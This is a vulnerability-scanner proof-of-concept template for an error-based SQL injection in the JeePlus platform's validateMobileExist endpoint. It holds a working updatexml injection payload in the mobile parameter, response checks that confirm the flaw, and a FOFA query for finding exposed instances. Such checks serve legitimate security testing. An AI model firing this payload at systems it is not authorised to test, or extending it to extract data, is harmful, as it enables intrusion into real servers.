id: poc-yaml-jeeplus-validatemobileexist-sqli
info:
  name: JeePlus快速开发平台 validateMobileExist SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: JeePlus快速开发平台
  fofa: app="JeePlus"
variables:
  t1: random_int(1,100000)
requests:
- method: GET
  path: /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%28{{.t1}}%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271
  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,substr(md5(t1),0,31))
transport: http
